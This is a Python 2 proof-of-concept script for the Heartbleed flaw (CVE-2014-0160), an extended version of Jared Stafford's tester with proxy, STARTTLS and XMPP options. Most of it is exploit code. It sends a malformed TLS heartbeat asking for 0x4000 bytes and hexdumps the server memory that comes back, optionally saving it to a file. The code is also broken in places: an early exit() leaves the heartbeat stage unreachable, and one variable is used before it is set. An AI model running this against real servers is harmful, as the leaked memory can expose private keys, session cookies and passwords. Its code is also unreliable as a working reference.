#!/usr/bin/env python2

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
#
# tintinweb | https://github.com/tintinweb
# added proxy CONNECT support
# added HB packet variation for IPS testing
# added valid HB message padding (without HMAC)
# added options for custom HeartBeat.len, payload, fixed size TLSRecord.len, padding
#
# added some features of other gists (see options for credits)
#

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
options.add_option('-r', '--proxy', action='store', type='string', default="", help='Use Proxy server for connection (CONNECT)')
options.add_option('-l', '--hblen', type='int', default=0x4000, help='Heartbeat: defined payload lenth (>=4073)')
options.add_option('-o', '--hbload', action='store', type='string', default='', help='Heartbeat: payload')
options.add_option('-A', '--nofixtlslen', action='store_true', default=False, help='Do not autofix TLS Record Length')
options.add_option('-P', '--nopadding', action='store_true', default=False, help='Do not add HBMessage padding')
options.add_option('--tls10', action='store_true', default=False, help='use tls 1.0 (default: tls 1.1)')
options.add_option('-x', '--xmpp', action='store_true', default=False, help='Check XMPP STARTTLS')		# taken from: https://gist.github.com/tahajahangir/10396581
options.add_option('-t', '--hostname', dest='hostname', help='Use given host name in XMPP,Proxy CONNECT') # --""--
options.add_option('--dump-file', default='', help='dump file filename (default:response.dat')			  # --""--


def hexdump_squashed(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        if hxdat == "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00":
            if allnulls == 1:
                continue
            hxdat = '...'
            allnulls = 1
            pdat = ''
        else:
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
            allnulls = 0
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print



def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s, hb, opts):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print '[ *] [TCP] [TLS?] No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            print 'Received heartbeat response:'
            hexdump_squashed(pay)
            if len(opts.dump_file):
                with open(opts.dump_file, "a") as dump:
                     dump.write(pay)
            if len(pay) > 3:
                print '[ *] [TCP] [TLS] WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print '[ *] [TCP] [TLS] Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump_squashed(pay)
            print '[ *] [TCP] [TLS] Server returned error, likely not vulnerable'
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if len(opts.proxy):
        ip,port = opts.proxy.split(":")
        port=int(port)
    else:
        ip = args[0]
        port=opts.port

    print "[ *] [TCP] Connecting.. %s:%s"%(ip,port)
    sys.stdout.flush()
    s.connect((ip,port))

    print "[ *] [TCP] Connection successful (tcp)!"
    if opts.starttls:
        re = s.recv(4096)
        if opts.debug: print re
        s.send('ehlo starttlstest\n')
        re = s.recv(1024)
        if opts.debug: print re
        if not 'STARTTLS' in re:
            if opts.debug: print re
            print '     [STARTTLS] STARTTLS not supported...'
            sys.exit(0)
        s.send('starttls\n')
        re = s.recv(1024)

    if len(opts.proxy):
        hoststr="%s:%s"%(opts.hostname or args[0],opts.port)
        connect = 'CONNECT %s HTTP/1.1\nUser-Agent: hbtest\nProxy-Connection: keep-alive\nConnection: keep-alive\nHost: %s\n\n'%(hoststr,hoststr)
        if opts.debug:
            print connect
        s.send(connect)
        re = s.recv(1024)
        if not "HTTP/1.1 200 Connection established".lower() in re.lower():
            print "     [PROXY] ERROR - response: %s"%re
        else:
            print re
			
    if opts.xmpp:
        s.send('<stream:stream xmlns="jabber:client" version="1.0" xmlns:stream="http://etherx.jabber.org/streams" to="%s">' % (opts.hostname or args[0]))
        re = s.recv(4096)
        while not '<stream:features' in re:
            if opts.debug: print re
            re = s.recv(4096)
        if opts.debug: print re
        if not 'urn:ietf:params:xml:ns:xmpp-tls' in re:
            print '     [XMPP] STARTTLS not supported...'
            sys.exit(0)
        s.send('<starttls xmlns="urn:ietf:params:xml:ns:xmpp-tls"/>')
        re = s.recv(4096)
        if opts.debug: print re

    print '[ *] [TCP] [TLS] Sending Client Hello...'
    sys.stdout.flush()
    
    import layer.ssl.tls as x
    hello = x.TLSRecord(version=0x0309,length=5+40)/x.TLSHandshake(length=41, data=x.TLSClientHello(version=0x0308))
    #hello = x.TLSRecord(version=0x0301,)/x.TLSHandshake(length=2, data=x.TLSClientHello(version=0x0302))
    hello=hello.serialize()
    hexdump_squashed(hello[:45+5])
    
    s.send(hello[:45+5])
    exit()
    print '[ *] [TCP] [TLS] Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print '[ *] [TCP] Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print '[ *] [TCP] [TLS] Sending heartbeat request...'
    sys.stdout.flush()

    hb = x.TLSRecord(version=0x0302)/x.TLSHeartBeat( payload_length=0x4000)
    hb = hb.serialize()
    hexdump_squashed(hb)
    opts.debug=True
    s.send(hb)
    hit_hb(s,hb, opts)

if __name__ == '__main__':
    main()
